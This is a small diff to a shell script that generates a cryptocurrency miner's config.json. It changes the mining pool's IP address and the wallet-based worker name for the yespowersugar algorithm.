@@ -7,8 +7,8 @@ current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
 # Create config.json with the current date
 cat > config.json <<END
 {
-  "url": "45.115.224.77:443",
-  "user": "sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.blood",
+  "url": "45.115.225.36:443",
+  "user": "sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.bloody",
   "pass": "x",
   "threads": 5,
   "algo": "yespowersugar"
